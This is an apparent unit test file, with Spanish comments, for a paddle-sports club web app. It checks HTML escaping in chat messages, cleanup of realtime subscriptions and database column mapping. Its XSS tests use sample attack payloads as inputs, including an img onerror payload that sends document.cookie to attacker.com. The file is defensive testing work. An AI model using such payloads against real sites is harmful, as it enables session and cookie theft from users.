// ==============================================================================
// tests/unit/social-club-resilience.test.mjs
// SUITE UNITARIA: PREVENCIÓN XSS, LIMPIEZA DE CANALES REALTIME Y CONSISTENCIA SQL
// PaddleSafe v5.18 - Arquitectura y Resiliencia Social & Clubes
// ==============================================================================

import assert from 'node:assert/strict';

// Configuración de mock Supabase en entorno Node.js
let mockLastTable = null;
let mockLastUpdatePayload = null;
let mockLastRpcName = null;
let mockLastRpcParams = null;
let mockChannelRemoved = false;

const mockClient = {
    from: (table) => ({
        update: (payload) => {
            mockLastTable = table;
            mockLastUpdatePayload = payload;
            return {
                eq: () => ({
                    select: async () => ({ data: [{ id: 'club-1', ...payload }], error: null })
                })
            };
        },
        select: () => ({
            eq: () => ({
                order: () => ({
                    limit: async () => ({ data: [], error: null })
                }),
                maybeSingle: async () => ({ data: null, error: null }),
                single: async () => ({ data: { id: 'club-1', nombre: 'Mock Club' }, error: null })
            })
        })
    }),
    rpc: async (name, params) => {
        mockLastRpcName = name;
        mockLastRpcParams = params;
        return { data: [], error: null };
    },
    removeChannel: (ch) => {
        mockChannelRemoved = true;
    },
    channel: () => ({
        on: function() { return this; },
        subscribe: function() { return this; }
    }),
    storage: {
        from: () => ({
            upload: async () => ({ error: null }),
            getPublicUrl: () => ({ data: { publicUrl: 'https://paddlesafe.app/test.jpg' } })
        })
    }
};

globalThis.window = globalThis.window || {};
globalThis.window.supabase = {
    createClient: () => mockClient
};

console.log('\n======================================================');
console.log('SUITE UNITARIA: SOCIAL, CLUBES, XSS Y CONSISTENCIA SQL');
console.log('======================================================\n');

let passCount = 0;
let totalCount = 0;

async function it(name, fn) {
    totalCount++;
    try {
        await fn();
        passCount++;
        console.log(`  ✅ [PASS] ${name}`);
    } catch (err) {
        console.error(`  ❌ [FAIL] ${name}`);
        console.error(err);
        process.exitCode = 1;
    }
}

// ==============================================================================
// GRUPO 1: PREVENCIÓN DE XSS (CHAT, BURBUJAS Y ATRIBUTOS ONCLICK)
// ==============================================================================
console.log('[GRUPO 1] Prevención de XSS e Inyecciones en Chat y Tarjetas');

await it('Función esc() neutraliza caracteres peligrosos de HTML (<, >, ", \', &)', async () => {
    const { esc } = await import('../../public_html/js/utils.js');
    const attackPayload = '<script>alert("XSS")</script>&<img src=\'x\' onerror=alert(1)>';
    const escaped = esc(attackPayload);

    assert.ok(!escaped.includes('<script>'), 'No debe contener tags de script abiertos');
    assert.ok(!escaped.includes('</script>'), 'No debe contener tags de script cerrados');
    assert.ok(escaped.includes('&lt;script&gt;'), 'Debe codificar < y > a entidades seguras');
    assert.ok(escaped.includes('&quot;'), 'Debe codificar comillas dobles');
    assert.ok(escaped.includes('&#39;'), 'Debe codificar comillas simples');
    assert.ok(escaped.includes('&amp;'), 'Debe codificar ampersands');
});

await it('renderBurbujaMensaje formatea mensajes de chat ajenos con autor y mensaje neutralizados', async () => {
    const { ClubChat } = await import('../../public_html/js/club/club.chat.js');
    const payloadMalicioso = {
        id: 'msg-1',
        user_id: 'user-hacker-123',
        mensaje: '<img src=x onerror=fetch("https://attacker.com?c="+document.cookie)>',
        created_at: new Date().toISOString(),
        perfiles: {
            nombre: 'Hacker <script>alert(1)</script>',
            avatar_url: 'https://paddlesafe.app/avatar.jpg'
        }
    };

    const html = ClubChat.renderBurbujaMensaje(payloadMalicioso, 'my-own-id');
    assert.ok(!html.includes('<script>'), 'El nombre del autor no debe inyectar scripts ejecutables');
    assert.ok(!html.includes('<img src=x'), 'El cuerpo del mensaje no debe contener tags img ejecutables');
    assert.ok(html.includes('&lt;img') || html.includes('&lt;script&gt;'), 'Las etiquetas maliciosas deben estar codificadas a entidades HTML');
});

await it('renderBurbujaMensaje formatea mensajes propios con sanitización estricta', async () => {
    const { ClubChat } = await import('../../public_html/js/club/club.chat.js');
    const myId = 'user-me-456';
    const payloadPropio = {
        id: 'msg-2',
        user_id: myId,
        mensaje: '<b>Hola equipo</b><iframe src="javascript:alert(1)"></iframe>',
        created_at: new Date().toISOString()
    };

    const html = ClubChat.renderBurbujaMensaje(payloadPropio, myId);
    assert.ok(!html.includes('<iframe'), 'No debe renderizar iframe HTML no sanitizado');
    assert.ok(!html.includes('<b>'), 'No debe interpretar etiquetas HTML sin escapar');
    assert.ok(html.includes('&lt;b&gt;Hola equipo&lt;/b&gt;'), 'Debe escapar etiquetas a entidades HTML');
});

// ==============================================================================
// GRUPO 2: LIMPIEZA DE SUSCRIPCIONES REALTIME Y POLLING EN CHAT
// ==============================================================================
console.log('\n[GRUPO 2] Limpieza Proactiva de Canales Realtime y Polling en ClubChat');

await it('ClubChat.desuscribirRealtime() se ejecuta sin lanzar excepciones y limpia variables', async () => {
    const { ClubChat } = await import('../../public_html/js/club/club.chat.js');
    assert.doesNotThrow(() => ClubChat.desuscribirRealtime());
});

await it('ClubPublic.cambiarTab() desuscribe el chat al alternar a cualquier pestaña distinta de chat', async () => {
    const { ClubPublic } = await import('../../public_html/js/club/club.public.js');
    const { ClubChat } = await import('../../public_html/js/club/club.chat.js');

    let desuscritoLlamado = false;
    const origDesuscribir = ClubChat.desuscribirRealtime;
    ClubChat.desuscribirRealtime = () => {
        desuscritoLlamado = true;
    };

    try {
        await ClubPublic.cambiarTab('info');
        assert.ok(desuscritoLlamado, 'Debe haber llamado a desuscribirRealtime al cambiar a tab "info"');

        desuscritoLlamado = false;
        await ClubPublic.cambiarTab('miembros');
        assert.ok(desuscritoLlamado, 'Debe haber llamado a desuscribirRealtime al cambiar a tab "miembros"');

        desuscritoLlamado = false;
        await ClubPublic.cambiarTab('eventos');
        assert.ok(desuscritoLlamado, 'Debe haber llamado a desuscribirRealtime al cambiar a tab "eventos"');
    } finally {
        ClubChat.desuscribirRealtime = origDesuscribir;
    }
});

// ==============================================================================
// GRUPO 3: CONSISTENCIA SQL / JS CON PADDLESAFE_MASTER_DATABASE_V3_FIXED.SQL
// ==============================================================================
console.log('\n[GRUPO 3] Consistencia SQL/JS y Normalización de Columnas en ClubAPI');

await it('ClubAPI.updateField mapea portada_url a banner_url y descarta columnas inexistentes', async () => {
    const { ClubAPI } = await import('../../public_html/js/club/api.js');

    const payloadBruto = {
        nombre: 'Club Costa Blanca SUP',
        portada_url: 'https://paddlesafe.app/banner-test.jpg',
        puntos: 500, // No existe en public.clubs según FIXED.sql
        normas: 'Normas del club', // No existe en public.clubs según FIXED.sql
        extra_fake_column: 'malicious'
    };

    await ClubAPI.updateField('club-1', payloadBruto);

    assert.equal(mockLastTable, 'clubs', 'Debe actualizar la tabla "clubs"');
    assert.equal(mockLastUpdatePayload.nombre, 'Club Costa Blanca SUP', 'Debe conservar columnas permitidas');
    assert.equal(mockLastUpdatePayload.banner_url, 'https://paddlesafe.app/banner-test.jpg', 'Debe normalizar portada_url a banner_url');
    assert.equal(mockLastUpdatePayload.portada_url, undefined, 'No debe enviar portada_url a la BD');
    assert.equal(mockLastUpdatePayload.puntos, undefined, 'No debe enviar puntos a la tabla clubs');
    assert.equal(mockLastUpdatePayload.normas, undefined, 'No debe enviar normas a la tabla clubs');
    assert.equal(mockLastUpdatePayload.extra_fake_column, undefined, 'No debe enviar columnas no permitidas');
});

await it('ClubAPI expone firmas canónicas de RPC alineadas con FIXED.sql', async () => {
    const { ClubAPI } = await import('../../public_html/js/club/api.js');
    assert.equal(typeof ClubAPI.getMyClubs, 'function', 'ClubAPI.getMyClubs debe existir');
    assert.equal(typeof ClubAPI.getMembers, 'function', 'ClubAPI.getMembers debe existir');
    assert.equal(typeof ClubAPI.getRequests, 'function', 'ClubAPI.getRequests debe existir');
    assert.equal(typeof ClubAPI.processRequest, 'function', 'ClubAPI.processRequest debe existir');
    assert.equal(typeof ClubAPI.createClub, 'function', 'ClubAPI.createClub debe existir');
    assert.equal(typeof ClubAPI.deleteClub, 'function', 'ClubAPI.deleteClub debe existir');
});

await it('ClubFacade.abrirRutaEvento resuelve rutas en caché sin inyección JSON en atributos', async () => {
    const { default: ClubFacade } = await import('../../public_html/js/club/index.js');
    const { ClubEvents } = await import('../../public_html/js/club/club.events.js');

    let rutaCargada = null;
    let nombreCargado = null;

    const fnCargar = (coords, nombre) => {
        rutaCargada = coords;
        nombreCargado = nombre;
    };
    globalThis.cargarRutaEnMapaGrande = fnCargar;
    if (globalThis.window) globalThis.window.cargarRutaEnMapaGrande = fnCargar;

    ClubEvents._eventosCache = {
        'evento-test-77': {
            id: 'evento-test-77',
            nombre: 'Travesía Cabo de San Antonio',
            ruta_json: [[38.80, 0.15], [38.81, 0.16]]
        }
    };

    ClubFacade.abrirRutaEvento('evento-test-77');

    assert.equal(nombreCargado, 'Travesía Cabo de San Antonio');
    assert.deepEqual(rutaCargada, [[38.80, 0.15], [38.81, 0.16]]);
});

console.log('\n======================================================');
console.log(`RESUMEN TESTS SOCIAL & CLUBES: ${passCount} / ${totalCount} PASADOS`);
console.log('======================================================\n');

if (passCount !== totalCount) {
    process.exit(1);
}
